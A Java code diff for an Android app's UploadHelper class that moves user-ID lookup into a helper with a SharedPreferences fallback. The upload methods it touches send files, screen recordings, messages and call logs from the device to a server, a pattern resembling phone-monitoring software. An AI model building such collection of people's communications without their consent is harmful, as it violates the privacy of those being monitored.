@@ -20,6 +20,15 @@ public class UploadHelper {
     private static final int MAX_RETRIES = 3;
     private static final int RETRY_DELAY_MS = 2000;
 
+    private static String getUserId(Context context) {
+        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+        if (user != null) return user.getUid();
+        
+        // Fallback to SharedPreferences
+        return context.getSharedPreferences("UserPrefs", Context.MODE_PRIVATE)
+                      .getString("userId", null);
+    }
+
     // ✅ For File Uploads (photos, videos, docs, screen recordings, etc)
     public static void uploadFile(Context context, File file, String endpoint) {
         new Thread(() -> {
@@ -31,8 +40,8 @@ public class UploadHelper {
                 conn.setRequestProperty("Content-Type", "application/octet-stream");
                 conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
                 conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
-                FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-                if (user != null) conn.setRequestProperty("User-ID", user.getUid());
+                String uid = getUserId(context);
+                if (uid != null) conn.setRequestProperty("User-ID", uid);
 
                 OutputStream os = conn.getOutputStream();
                 FileInputStream fis = new FileInputStream(file);
@@ -63,8 +72,8 @@ public class UploadHelper {
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "application/json");
             conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
-            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-            if (user != null) conn.setRequestProperty("User-ID", user.getUid());
+            String uid = getUserId(context);
+            if (uid != null) conn.setRequestProperty("User-ID", uid);
 
             JSONObject json = new JSONObject();
             json.put("type", type);
@@ -104,8 +113,8 @@ public class UploadHelper {
                     conn.setDoOutput(true);
                     conn.setRequestProperty("Content-Type", "application/json");
                     conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
-                    FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-                    if (user != null) conn.setRequestProperty("User-ID", user.getUid());
+                    String uid = getUserId(context);
+                    if (uid != null) conn.setRequestProperty("User-ID", uid);
 
                     JSONObject json = new JSONObject();
                     json.put("sender", sender);
@@ -144,8 +153,8 @@ public class UploadHelper {
                 conn.setDoOutput(true);
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
-                FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-                if (user != null) conn.setRequestProperty("User-ID", user.getUid());
+                String uid = getUserId(context);
+                if (uid != null) conn.setRequestProperty("User-ID", uid);
 
                 JSONObject json = new JSONObject();
                 json.put("type", "call_logs");
@@ -175,8 +184,8 @@ public class UploadHelper {
             conn.setRequestProperty("Content-Type", "application/octet-stream");
             conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
             conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
-            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-            if (user != null) conn.setRequestProperty("User-ID", user.getUid());
+            String uid = getUserId(context);
+            if (uid != null) conn.setRequestProperty("User-ID", uid);
 
             OutputStream os = conn.getOutputStream();
             FileInputStream fis = new FileInputStream(file);
